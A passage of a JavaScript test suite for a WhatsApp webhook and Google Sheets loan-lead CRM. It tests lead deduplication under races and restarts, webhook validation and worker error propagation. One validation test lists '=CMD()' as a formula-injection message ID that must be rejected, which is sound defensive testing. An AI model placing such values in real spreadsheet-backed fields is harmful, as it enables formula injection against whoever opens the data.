      makeWorkerRequest({
        eventId: 'META_CAT_BIZ',
        eventType: 'INBOUND_MESSAGE',
        provider: 'Meta',
        correlationId: 'CORR-CB',
        data: {
          fromPhone: AUTH_PHONE,
          msgId: 'wamid.cat_biz_1',
          profileName: 'Multi Product User',
          message: { type: 'text', text: { body: 'I also need a Business Loan for GST firm' }, id: 'wamid.cat_biz_1' }
        }
      })
    );
    // Generic follow-up must NOT spawn a 3rd Personal Loan lead
    const rGeneric = await workerRoute.POST(
      makeWorkerRequest({
        eventId: 'META_CAT_GEN',
        eventType: 'INBOUND_MESSAGE',
        provider: 'Meta',
        correlationId: 'CORR-CG',
        data: {
          fromPhone: AUTH_PHONE,
          msgId: 'wamid.cat_gen_1',
          profileName: 'Multi Product User',
          message: { type: 'text', text: { body: 'Hello, any update?' }, id: 'wamid.cat_gen_1' }
        }
      })
    );
    assert.equal(rHome.status, 200);
    assert.equal(rBiz.status, 200);
    assert.equal(rGeneric.status, 200);

    const leads = await sheets.leadRepository.findAll();
    assert.equal((await sheets.customerRepository.findAll()).length, 1);
    assert.equal(leads.length, 2, 'Distinct loan categories MUST stay separate without spawning spurious generic lead');
    const categories = leads.map((l) => l.loan_category).sort();
    assert.deepEqual(categories, ['Business Loan', 'Home Loan']);
  });

  it('F34-02-T05: Concurrent retries after simulated gateway timeout converge onto 1 customer and 1 lead', async () => {
    const vmHarness = createGatewayVmHarness();
    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/t5h35-timeout/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = GATEWAY_SECRET;

    let failLeadOnce = true;
    globalThis.fetch = async (url, init) => {
      const cmd = JSON.parse(JSON.parse(init.body).payloadJson);
      if (cmd.tab === 'LEADS' && (cmd.action === 'INSERT_IF_ABSENT' || cmd.action === 'UPSERT_ROW') && failLeadOnce) {
        failLeadOnce = false;
        const err = new Error('Gateway request timed out');
        err.name = 'AbortError';
        throw err;
      }
      return vmHarness.gatewayFetch(url, init);
    };

    const [a, b] = await Promise.allSettled([
      sheets.CrmSheetsService.registerOrUpdateCustomerLead({
        name: 'Timeout Retry User',
        phone: AUTH_PHONE,
        loanCategory: 'Doctor Loan',
        requestedAmount: '2500000'
      }),
      sheets.CrmSheetsService.registerOrUpdateCustomerLead({
        name: 'Timeout Retry User',
        phone: AUTH_PHONE,
        loanCategory: 'Doctor Loan',
        requestedAmount: '2500000'
      })
    ]);

    assert.ok(a.status === 'fulfilled' || b.status === 'fulfilled');
    // Retry cleanly to ensure final convergence
    const final = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Timeout Retry User',
      phone: AUTH_PHONE,
      loanCategory: 'Doctor Loan',
      requestedAmount: '2500000'
    });
    assert.ok(final.lead.lead_id.startsWith('AVL-'));
    assert.equal(vmHarness.sheetsMap.get('CUSTOMERS').length, 2, '1 customer row (+ header)');
    assert.equal(vmHarness.sheetsMap.get('LEADS').length, 2, '1 lead row (+ header)');
    assert.equal(vmHarness.sheetsMap.get('FOLLOWUPS').length, 2, '1 followup row (+ header)');
  });

  it('F34-02-T06: Two truly independent worker instances converge on 1 lead via real gateway.gs VM LockService + INSERT_IF_ABSENT', async () => {
    const vmHarness = createGatewayVmHarness();
    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/t5h35-two-inst/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = GATEWAY_SECRET;

    // Add tiny async jitter on gateway fetch so both independent instances interleave reads BEFORE writes!
    let readBarrierResolve;
    let leadsReads = 0;
    const readBarrier = new Promise((r) => {
      readBarrierResolve = r;
    });

    globalThis.fetch = async (url, init) => {
      const cmd = JSON.parse(JSON.parse(init.body).payloadJson);
      const res = await vmHarness.gatewayFetch(url, init);
      if (cmd.action === 'GET_ALL' && cmd.tab === 'LEADS') {
        leadsReads++;
        if (leadsReads >= 2) readBarrierResolve();
        // Wait briefly so BOTH independent instances observe 0 existing leads before either writes!
        await Promise.race([readBarrier, new Promise((r) => setTimeout(r, 80))]);
      }
      return res;
    };

    const inst1 = loadIsolatedAppInstance();
    const inst2 = loadIsolatedAppInstance();
    assert.notEqual(inst1.sheets.leadRepository, inst2.sheets.leadRepository, 'Instances must have independent memory');

    const [res1, res2] = await Promise.all([
      inst1.sheets.CrmSheetsService.registerOrUpdateCustomerLead({
        name: 'Distributed Race User',
        phone: AUTH_PHONE,
        loanCategory: 'Business Loan',
        requestedAmount: '1800000'
      }),
      inst2.sheets.CrmSheetsService.registerOrUpdateCustomerLead({
        name: 'Distributed Race User',
        phone: AUTH_PHONE,
        loanCategory: 'Business Loan',
        requestedAmount: '1800000'
      })
    ]);

    assert.equal(res1.customer.customer_id, res2.customer.customer_id);
    assert.equal(res1.lead.lead_id, res2.lead.lead_id, 'Independent worker instances MUST converge on exact deterministic lead_id');
    assert.equal(vmHarness.sheetsMap.get('CUSTOMERS').length, 2, 'Exactly 1 CUSTOMERS row');
    assert.equal(vmHarness.sheetsMap.get('LEADS').length, 2, 'Exactly 1 LEADS row via gateway.gs INSERT_IF_ABSENT');
    assert.equal(vmHarness.sheetsMap.get('CONSENTS').length, 2, 'Exactly 1 CONSENTS row');
    assert.equal(vmHarness.sheetsMap.get('FOLLOWUPS').length, 2, 'Exactly 1 FOLLOWUPS row');
    assert.ok((vmHarness.stats.actions.INSERT_IF_ABSENT || 0) >= 2, 'Both instances must execute atomic INSERT_IF_ABSENT');
  });

  it('F34-02-T07: Duplicate request after simulated process restart converges deterministically on existing lead', async () => {
    const vmHarness = createGatewayVmHarness();
    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/t5h35-restart/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = GATEWAY_SECRET;
    globalThis.fetch = vmHarness.gatewayFetch;

    const beforeRestart = loadIsolatedAppInstance();
    const r1 = await beforeRestart.sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Restart User',
      phone: AUTH_PHONE,
      loanCategory: 'Home Loan',
      requestedAmount: '5000000'
    });

    // Fresh process instance (zero in-memory state carried over)
    const afterRestart = loadIsolatedAppInstance();
    const r2 = await afterRestart.sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Restart User',
      phone: AUTH_PHONE,
      loanCategory: 'Home Loan',
      requestedAmount: '5000000'
    });

    assert.equal(r1.lead.lead_id, r2.lead.lead_id);
    assert.equal(vmHarness.sheetsMap.get('CUSTOMERS').length, 2);
    assert.equal(vmHarness.sheetsMap.get('LEADS').length, 2);
  });

  it('F34-02-T08: Duplicate request after partial customer/lead/followup write converges cleanly', async () => {
    const vmHarness = createGatewayVmHarness();
    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/t5h35-partial/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = GATEWAY_SECRET;

    let failTab = 'LEADS';
    globalThis.fetch = async (url, init) => {
      const cmd = JSON.parse(JSON.parse(init.body).payloadJson);
      if (failTab && cmd.tab === failTab && (cmd.action === 'INSERT_IF_ABSENT' || cmd.action === 'UPSERT_ROW')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({ ok: false, status: 503, code: 'GOOGLE_SHEETS_UNAVAILABLE', error: 'Simulated partial write failure' })
        };
      }
      return vmHarness.gatewayFetch(url, init);
    };

    // Attempt 1: CUSTOMERS & CONSENTS succeed, LEADS fails
    await assert.rejects(() =>
      sheets.CrmSheetsService.registerOrUpdateCustomerLead({
        name: 'Partial Write User',
        phone: AUTH_PHONE,
        loanCategory: 'Education Loan — India',
        requestedAmount: '800000'
      })
    );
    assert.equal(vmHarness.sheetsMap.get('CUSTOMERS').length, 2);
    assert.equal(vmHarness.sheetsMap.get('LEADS').length, 1);

    // Attempt 2: LEADS succeeds, FOLLOWUPS fails
    failTab = 'FOLLOWUPS';
    await assert.rejects(() =>
      sheets.CrmSheetsService.registerOrUpdateCustomerLead({
        name: 'Partial Write User',
        phone: AUTH_PHONE,
        loanCategory: 'Education Loan — India',
        requestedAmount: '800000'
      })
    );
    assert.equal(vmHarness.sheetsMap.get('LEADS').length, 2);
    assert.equal(vmHarness.sheetsMap.get('FOLLOWUPS').length, 1);

    // Attempt 3: Full recovery converges cleanly with zero duplicates
    failTab = null;
    const recovered = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Partial Write User',
      phone: AUTH_PHONE,
      loanCategory: 'Education Loan — India',
      requestedAmount: '800000'
    });
    assert.ok(recovered.lead.lead_id.startsWith('AVL-'));
    assert.equal(vmHarness.sheetsMap.get('CUSTOMERS').length, 2);
    assert.equal(vmHarness.sheetsMap.get('CONSENTS').length, 2);
    assert.equal(vmHarness.sheetsMap.get('LEADS').length, 2);
    assert.equal(vmHarness.sheetsMap.get('FOLLOWUPS').length, 2);
  });

  it('F34-02-T09: Distinct customers requesting identical loan category never merge', async () => {
    const a = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Customer Alpha',
      phone: '+919811111111',
      loanCategory: 'Business Loan'
    });
    const b = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Customer Beta',
      phone: '+919822222222',
      loanCategory: 'Business Loan'
    });
    assert.notEqual(a.customer.customer_id, b.customer.customer_id);
    assert.notEqual(a.lead.lead_id, b.lead.lead_id);
    assert.equal((await sheets.customerRepository.findAll()).length, 2);
    assert.equal((await sheets.leadRepository.findAll()).length, 2);
  });
});

// ============================================================================
// GROUP 3 — DEFECT F34-03: SHARED /api/whatsapp-webhook CONTRACT
// ============================================================================
describe('Group 3 — F34-03 Shared /api/whatsapp-webhook ChatMitra & Meta Contract', () => {
  let envSnap;
  beforeEach(() => {
    envSnap = snapshotEnv();
    setupMockEnv();
  });
  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
    restoreEnv(envSnap);
  });

  it('F34-03-T01: Missing message ID rejected HTTP 400 with zero Date.now() fabrication (ChatMitra & Meta)', async () => {
    // ChatMitra inbound without id (ADV-5H34-WH-CM-01 replay)
    const cmIn = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.received', from: AUTH_DIGITS, text: 'No id' })
    );
    assert.equal(cmIn.status, 400);
    const cmInData = await cmIn.json();
    assert.equal(cmInData.success, false);
    assert.equal(cmInData.persisted, false);
    assert.equal(cmInData.error, 'INVALID_MESSAGE_ID');

    // ChatMitra status without messageId
    const cmSt = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.status.updated', status: 'delivered' })
    );
    assert.equal(cmSt.status, 400);
    assert.equal((await cmSt.json()).error, 'INVALID_MESSAGE_ID');

    // Meta inbound without message.id (line 580 fallback eliminated!)
    const metaNoId = {
      object: 'whatsapp_business_account',
      entry: [{ changes: [{ value: { messages: [{ from: AUTH_DIGITS, type: 'text', text: { body: 'No id' } }] } }] }]
    };
    const metaIn = await metaWebhookRoute.POST(
      makeSharedWebhookRequest(metaNoId, { secret: META_SECRET, header: 'x-hub-signature-256', prefix: 'sha256=' })
    );
    assert.equal(metaIn.status, 400);
    assert.equal((await metaIn.json()).error, 'INVALID_MESSAGE_ID');

    // Zero fabricated events in WEBHOOK_EVENTS
    assert.equal((await sheets.webhookEventRepository.findAll()).length, 0);
  });

  it('F34-03-T02: Empty, whitespace, formula-prefixed, and fabricated timestamp message IDs rejected HTTP 400', async () => {
    for (const badId of ['', '   ', '=CMD()', 'cm_inbound_1795216644632', 'meta_1795216644632', 'null']) {
      const r = await metaWebhookRoute.POST(
        makeSharedWebhookRequest({ event: 'message.received', id: badId, from: AUTH_DIGITS, text: 'Hi' })
      );
      assert.equal(r.status, 400, `Bad id "${badId}" must return HTTP 400`);
      const d = await r.json();
      assert.equal(d.success, false);
      assert.equal(d.persisted, false);
      assert.equal(d.error, 'INVALID_MESSAGE_ID');
    }
    assert.equal((await sheets.webhookEventRepository.findAll()).length, 0);
  });

  it('F34-03-T03: Missing or invalid sender phone rejected HTTP 400 (never silent HTTP 200)', async () => {
    const rMissing = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.received', id: 'cm_no_sender_1', text: 'Hi' })
    );
    assert.equal(rMissing.status, 400);
    const dMissing = await rMissing.json();
    assert.equal(dMissing.success, false);
    assert.equal(dMissing.persisted, false);
    assert.equal(dMissing.error, 'MISSING_SENDER');

    const rInvalid = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.received', id: 'cm_bad_sender_1', from: 'NOT_A_PHONE', text: 'Hi' })
    );
    assert.equal(rInvalid.status, 400);
    assert.equal((await rInvalid.json()).error, 'INVALID_SENDER_PHONE');

    const metaNoFrom = {
      object: 'whatsapp_business_account',
      entry: [{ changes: [{ value: { messages: [{ id: 'wamid.nofrom_1', type: 'text', text: { body: 'Hi' } }] } }] }]
    };
    const rMetaNoFrom = await metaWebhookRoute.POST(
      makeSharedWebhookRequest(metaNoFrom, { secret: META_SECRET, header: 'x-hub-signature-256', prefix: 'sha256=' })
    );
    assert.equal(rMetaNoFrom.status, 400);
    assert.equal((await rMetaNoFrom.json()).error, 'MISSING_SENDER');
  });

  it('F34-03-T04: Malformed provider payloads (bad JSON, missing status, empty Meta entry) rejected HTTP 400', async () => {
    const badJson = await metaWebhookRoute.POST(makeSharedWebhookRequest('{broken_json'));
    assert.equal(badJson.status, 400);

    const noStatus = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.status.updated', messageId: 'cm_nostatus_1' })
    );
    assert.equal(noStatus.status, 400);
    assert.equal((await noStatus.json()).error, 'INVALID_STATUS_PAYLOAD');

    const emptyMeta = { object: 'whatsapp_business_account', entry: [{ changes: [{ value: { messages: [] } }] }] };
    const rEmptyMeta = await metaWebhookRoute.POST(
      makeSharedWebhookRequest(emptyMeta, { secret: META_SECRET, header: 'x-hub-signature-256', prefix: 'sha256=' })
    );
    assert.equal(rEmptyMeta.status, 400);
    assert.equal((await rEmptyMeta.json()).persistenceState, 'UNSUPPORTED_EVENT');
  });

  it('F34-03-T05: Genuine duplicate ChatMitra event on /api/whatsapp-webhook returns DUPLICATE_ALREADY_PERSISTED without re-calling worker', async () => {
    let workerCalls = 0;
    globalThis.fetch = async (url, init) => {
      workerCalls++;
      const w = await workerRoute.POST(new Request(url, { method: init.method, headers: init.headers, body: init.body }));
      return { ok: w.status >= 200 && w.status < 300, status: w.status, json: () => w.json() };
    };

    const payload = { event: 'message.received', id: 'cm_gen_dup_1', from: AUTH_DIGITS, text: 'Home Loan' };
    const r1 = await metaWebhookRoute.POST(makeSharedWebhookRequest(payload));
    assert.equal(r1.status, 200);
    assert.equal((await r1.json()).persisted, true);

    const r2 = await metaWebhookRoute.POST(makeSharedWebhookRequest(payload));
    assert.equal(r2.status, 200);
    const d2 = await r2.json();
    assert.equal(d2.duplicate, true);
    assert.equal(d2.persisted, false);
    assert.equal(d2.persistenceState, 'DUPLICATE_ALREADY_PERSISTED');
    assert.equal(workerCalls, 1, 'Duplicate must NOT re-dispatch worker');
  });

  it('F34-03-T06: Previously FAILED ChatMitra event on /api/whatsapp-webhook is NOT swallowed as duplicate and retries cleanly', async () => {
    await sheets.webhookEventRepository.registerWebhookEventIdempotent({
      event_id: 'CM_INBOUND_cm_retry_ok_1',
      provider: 'ChatMitra',
      event_type: 'INBOUND_MESSAGE',
      rawPayloadForHashOnly: { id: 'cm_retry_ok_1' }
    });
    await sheets.webhookEventRepository.markWebhookStatus({
      event_id: 'CM_INBOUND_cm_retry_ok_1',
      processing_status: 'FAILED',
      error_code: 'GOOGLE_SHEETS_UNAVAILABLE'
    });

    wireLocalWorkerFetch();
    const r = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.received', id: 'cm_retry_ok_1', from: AUTH_DIGITS, text: 'Business Loan' })
    );
    assert.equal(r.status, 200);
    const d = await r.json();
    assert.equal(d.duplicate, undefined);
    assert.equal(d.persisted, true);
    assert.equal((await sheets.webhookEventRepository.findById('CM_INBOUND_cm_retry_ok_1')).processing_status, 'COMPLETED');
  });

  it('F34-03-T07: Worker HTTP 401 and missing INTERNAL_WORKER_SECRET mark WEBHOOK_EVENTS FAILED (never stuck RECEIVED)', async () => {
    globalThis.fetch = async () => ({ ok: false, status: 401, json: async () => ({ success: false, error: 'Unauthorized' }) });
    const r401 = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.received', id: 'cm_w401_1', from: AUTH_DIGITS, text: 'Hi' })
    );
    assert.equal(r401.status, 503);
    const d401 = await r401.json();
    assert.equal(d401.persisted, false);
    assert.equal(d401.error, 'WORKER_UNAUTHORIZED');
    const wh401 = await sheets.webhookEventRepository.findById('CM_INBOUND_cm_w401_1');
    assert.equal(wh401.processing_status, 'FAILED');
    assert.equal(wh401.error_code, 'WORKER_UNAUTHORIZED');

    process.env.INTERNAL_WORKER_SECRET = '';
    const rNoSec = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.received', id: 'cm_nosec_1', from: AUTH_DIGITS, text: 'Hi' })
    );
    assert.equal(rNoSec.status, 503);
    const whNoSec = await sheets.webhookEventRepository.findById('CM_INBOUND_cm_nosec_1');
    assert.equal(whNoSec.processing_status, 'FAILED');
    assert.equal(whNoSec.error_code, 'WORKER_AUTH_UNCONFIGURED');
  });

  it('F34-03-T08: Worker HTTP 503 and 429 propagate failure and preserve semantic error_code on WEBHOOK_EVENTS', async () => {
    globalThis.fetch = async () => ({
      ok: false,
      status: 503,
      json: async () => ({
        success: false,
        persisted: false,
        persistenceState: 'PENDING_CUSTOMER_IDENTITY',
        error: 'CUSTOMER_IDENTITY_UNRESOLVED'
      })
    });
    const r503 = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.status.updated', messageId: 'cm_w503_1', status: 'delivered' })
    );
    assert.equal(r503.status, 503);
    const d503 = await r503.json();
    assert.equal(d503.success, false);
    assert.equal(d503.persisted, false);
    assert.equal(d503.error, 'CUSTOMER_IDENTITY_UNRESOLVED');
    assert.equal(d503.retryable, true);
    const wh503 = await sheets.webhookEventRepository.findById('CM_STATUS_cm_w503_1_DELIVERED');
    assert.equal(wh503.processing_status, 'FAILED');
    assert.equal(wh503.error_code, 'CUSTOMER_IDENTITY_UNRESOLVED');

    globalThis.fetch = async () => ({
      ok: false,
      status: 429,
      json: async () => ({ success: false, persisted: false, error: 'GOOGLE_SHEETS_QUOTA_EXCEEDED' })
    });
    const r429 = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.received', id: 'cm_w429_1', from: AUTH_DIGITS, text: 'Hi' })
    );
    assert.equal(r429.status, 429);
    const wh429 = await sheets.webhookEventRepository.findById('CM_INBOUND_cm_w429_1');
    assert.equal(wh429.processing_status, 'FAILED');
    assert.equal(wh429.error_code, 'GOOGLE_SHEETS_QUOTA_EXCEEDED');
  });

  it('F34-03-T09: Worker timeout returns HTTP 504 WORKER_TIMEOUT and marks WEBHOOK_EVENTS FAILED', async () => {
    process.env.WHATSAPP_WORKER_HANDOFF_TIMEOUT_MS = '50';
    globalThis.fetch = async (_url, init) =>
      new Promise((_, reject) => {
        init.signal.addEventListener('abort', () => {
          const e = new Error('aborted');
          e.name = 'AbortError';
          reject(e);
        });
      });

    const r = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.received', id: 'cm_to_1', from: AUTH_DIGITS, text: 'Hi' })
    );
    assert.equal(r.status, 504);
    const d = await r.json();
    assert.equal(d.timedOut, true);
    assert.equal(d.persisted, false);
    assert.equal(d.error, 'WORKER_TIMEOUT');
    const wh = await sheets.webhookEventRepository.findById('CM_INBOUND_cm_to_1');
    assert.equal(wh.processing_status, 'FAILED');
    assert.equal(wh.error_code, 'WORKER_TIMEOUT');
  });

  it('F34-03-T10: Google Sheets persistence failure returns HTTP 503 with zero MongoDB fallback', async () => {
    sheets.configureMockSheetsFaults({ forceUnavailable: true });
    const r = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.received', id: 'cm_offline_1', from: AUTH_DIGITS, text: 'Hi' })
    );
    assert.equal(r.status, 503);
    const d = await r.json();
    assert.equal(d.success, false);
    assert.equal(d.persisted, false);
    assert.equal(d.error, 'GOOGLE_SHEETS_UNAVAILABLE');
  });

  it('F34-03-T11: Unsupported event types return HTTP 400 UNSUPPORTED_EVENT (no false 200 fallthrough)', async () => {
    const rMsgSub = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ event: 'message.reaction', id: 'cm_react_1', emoji: '👍' })
    );
    assert.equal(rMsgSub.status, 400);
    const dMsgSub = await rMsgSub.json();
    assert.equal(dMsgSub.success, false);
    assert.equal(dMsgSub.persisted, false);
    assert.equal(dMsgSub.persistenceState, 'UNSUPPORTED_EVENT');

    const rFallthrough = await metaWebhookRoute.POST(
      makeSharedWebhookRequest({ unknownKey: 'noop_payload' })
    );
    assert.equal(rFallthrough.status, 400);
    const dFall = await rFallthrough.json();
    assert.equal(dFall.success, false);
    assert.equal(dFall.persisted, false);
    assert.equal(dFall.persistenceState, 'UNSUPPORTED_EVENT');
  });

  it('F34-03-T12: Duplicate delivery after simulated process restart is durably deduplicated via gateway.gs VM', async () => {
    const vmHarness = createGatewayVmHarness();
    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/t5h35-wh-restart/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = GATEWAY_SECRET;

    const inst1 = loadIsolatedAppInstance();
    let workerCalls = 0;
    globalThis.fetch = async (url, init) => {
      if (String(url).includes('whatsapp-webhook-worker')) {
        workerCalls++;
        const w = await inst1.workerRoute.POST(new Request(url, { method: init.method, headers: init.headers, body: init.body }));
        return { ok: w.status >= 200 && w.status < 300, status: w.status, json: () => w.json() };
      }
      return vmHarness.gatewayFetch(url, init);
    };

    const payload = { event: 'message.received', id: 'cm_restart_dup_1', from: AUTH_DIGITS, text: 'Home Loan' };
    const r1 = await inst1.metaWebhookRoute.POST(makeSharedWebhookRequest(payload));
    assert.equal(r1.status, 200);
    assert.equal((await r1.json()).persisted, true);

    // Cold restart instance
    const inst2 = loadIsolatedAppInstance();
    const r2 = await inst2.metaWebhookRoute.POST(makeSharedWebhookRequest(payload));
    assert.equal(r2.status, 200);
    const d2 = await r2.json();
    assert.equal(d2.duplicate, true);
    assert.equal(d2.persisted, false);
    assert.equal(workerCalls, 1, 'Process restart must NOT re-dispatch already-persisted webhook');
  });

  it('F34-03-T13: Meta and ChatMitra events with identical provider message IDs remain isolated end-to-end with correlation IDs preserved', async () => {
    wireLocalWorkerFetch();
    const sharedMsgId = 'shared_cross_provider_id_99';

    const metaPayload = {
      object: 'whatsapp_business_account',
      entry: [{
        changes: [{
          value: {
            contacts: [{ profile: { name: 'Meta User' } }],
            messages: [{ id: sharedMsgId, from: AUTH_DIGITS, type: 'text', text: { body: 'Need a Home Loan' } }]
          }
        }]
      }]
    };
    const rMeta = await metaWebhookRoute.POST(
      makeSharedWebhookRequest(metaPayload, {
        secret: META_SECRET,
        header: 'x-hub-signature-256',
        prefix: 'sha256=',
        correlationId: 'CORR-META-SHARED-99'
      })
    );
    assert.equal(rMeta.status, 200);
    const dMeta = await rMeta.json();
    assert.equal(dMeta.persisted, true);
    assert.equal(dMeta.correlationId, 'CORR-META-SHARED-99');

    const cmPayload = {
      event: 'message.received',
      id: sharedMsgId,
      from: '919822112233',
      name: 'ChatMitra User',
      text: 'Need a Business Loan'
    };
    const rCm = await metaWebhookRoute.POST(
      makeSharedWebhookRequest(cmPayload, {
        secret: CM_SECRET,
        header: 'x-webhook-signature',
        correlationId: 'CORR-CM-SHARED-99'
      })
    );
    assert.equal(rCm.status, 200);
    const dCm = await rCm.json();
    assert.equal(dCm.persisted, true);
    assert.equal(dCm.correlationId, 'CORR-CM-SHARED-99');

    const whAll = await sheets.webhookEventRepository.findAll();
    assert.equal(whAll.length, 2, 'Meta and ChatMitra must not overwrite each other in WEBHOOK_EVENTS');
    assert.ok(whAll.some((w) => w.event_id === `META_INBOUND_${sharedMsgId}`));
    assert.ok(whAll.some((w) => w.event_id === `CM_INBOUND_${sharedMsgId}`));

    const mMeta = await sheets.messageEventRepository.findByProviderMessageId(sharedMsgId, 'Meta');
    const mCm = await sheets.messageEventRepository.findByProviderMessageId(sharedMsgId, 'ChatMitra');
    assert.equal(mMeta.event_id, `MSG_META_${sharedMsgId}`);
    assert.equal(mCm.event_id, `MSG_CHATMITRA_${sharedMsgId}`);
    assert.notEqual(mMeta.customer_id, mCm.customer_id);
  });
});

// ============================================================================
// GROUP 4 — DEFECT F34-04: CHATMITRA ERROR PROPAGATION & MEDIA POLICY
// ============================================================================
describe('Group 4 — F34-04 ChatMitra Error Propagation & Safe Media Handling', () => {
  let envSnap;
  beforeEach(() => {
    envSnap = snapshotEnv();
    setupMockEnv();
  });
  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
    restoreEnv(envSnap);
  });

  it('F34-04-T01: CUSTOMER_IDENTITY_UNRESOLVED is preserved end-to-end (ADV-5H34-CM-02 subcase A replay)', async () => {
    wireLocalWorkerFetch();
    const r = await cmWebhookRoute.POST(
      makeChatMitraRequest(
        { event: 'message.status.updated', messageId: 'cm_st_unres_5h35', status: 'delivered', from: AUTH_DIGITS },
        { correlationId: 'CORR-CM-UNRES-1' }
      )
    );
    assert.equal(r.status, 200);
    await Promise.all(waitUntilPromises);

    const wh = await sheets.webhookEventRepository.findById('CM_STATUS_cm_st_unres_5h35_DELIVERED');
    assert.equal(wh.processing_status, 'FAILED');
    assert.equal(wh.error_code, 'CUSTOMER_IDENTITY_UNRESOLVED', 'Must NOT overwrite with generic WORKER_HTTP_503');
  });

  it('F34-04-T02: Worker 503 WITH structured body preserves HTTP status, semantic errorCode, retryability, and correlationId', async () => {
    await sheets.webhookEventRepository.registerWebhookEventIdempotent({
      event_id: 'CM_INBOUND_cm_struct_503',
      provider: 'ChatMitra',
      event_type: 'INBOUND_MESSAGE',
      rawPayloadForHashOnly: { id: 'cm_struct_503' }
    });
    globalThis.fetch = async () => ({
      ok: false,
      status: 503,
      json: async () => ({
        success: false,
        persisted: false,
        persistenceState: 'PENDING_CUSTOMER_IDENTITY',
        error: 'CUSTOMER_IDENTITY_UNRESOLVED',
        message: 'Customer identity pending reconciliation'
      })
    });

    const result = await cmWebhookRoute.dispatchChatMitraWorker({
      workerUrl: 'https://www.avanifinserv.com/api/whatsapp-webhook-worker',
      workerSecret: WORKER_SECRET,
      eventId: 'CM_INBOUND_cm_struct_503',
      correlationId: 'CORR-STRUCT-503',
      workerPayload: { eventId: 'CM_INBOUND_cm_struct_503', eventType: 'INBOUND_MESSAGE', provider: 'ChatMitra', data: {} }
    });

    assert.equal(result.ok, false);
    assert.equal(result.status, 503);
    assert.equal(result.persisted, false);
    assert.equal(result.errorCode, 'CUSTOMER_IDENTITY_UNRESOLVED');
    assert.equal(result.persistenceState, 'PENDING_CUSTOMER_IDENTITY');
    assert.equal(result.retryable, true);
    assert.equal(result.correlationId, 'CORR-STRUCT-503');

    const wh = await sheets.webhookEventRepository.findById('CM_INBOUND_cm_struct_503');
    assert.equal(wh.error_code, 'CUSTOMER_IDENTITY_UNRESOLVED');
  });

  it('F34-04-T03: Worker 503 WITHOUT structured body falls back safely to WORKER_HTTP_503 (or preserves existing semantic error)', async () => {
    await sheets.webhookEventRepository.registerWebhookEventIdempotent({
      event_id: 'CM_INBOUND_cm_raw_503',
      provider: 'ChatMitra',
      event_type: 'INBOUND_MESSAGE',
      rawPayloadForHashOnly: { id: 'cm_raw_503' }
    });
    globalThis.fetch = async () => ({
      ok: false,
      status: 503,
      json: async () => {
        throw new SyntaxError('Unexpected token < in HTML gateway error');
      }
    });

    const result = await cmWebhookRoute.dispatchChatMitraWorker({
      workerUrl: 'https://www.avanifinserv.com/api/whatsapp-webhook-worker',
      workerSecret: WORKER_SECRET,
      eventId: 'CM_INBOUND_cm_raw_503',
      correlationId: 'CORR-RAW-503',
      workerPayload: { eventId: 'CM_INBOUND_cm_raw_503', eventType: 'INBOUND_MESSAGE', provider: 'ChatMitra', data: {} }
    });

    assert.equal(result.ok, false);
    assert.equal(result.status, 503);
    assert.equal(result.errorCode, 'WORKER_HTTP_503');
    assert.equal(result.retryable, true);
    assert.equal(result.correlationId, 'CORR-RAW-503');
    assert.equal((await sheets.webhookEventRepository.findById('CM_INBOUND_cm_raw_503')).error_code, 'WORKER_HTTP_503');
  });

  it('F34-04-T04: Sticker event explicitly recorded as MEDIA_IGNORED and never converted to text (ADV-5H34-CM-02 subcase B replay)', async () => {
    let forwardedWorkerBody = null;
    globalThis.fetch = async (url, init) => {
      forwardedWorkerBody = JSON.parse(init.body);
      const w = await workerRoute.POST(new Request(url, { method: init.method, headers: init.headers, body: init.body }));
      return { ok: w.status >= 200 && w.status < 300, status: w.status, json: () => w.json() };
    };

    const r = await cmWebhookRoute.POST(
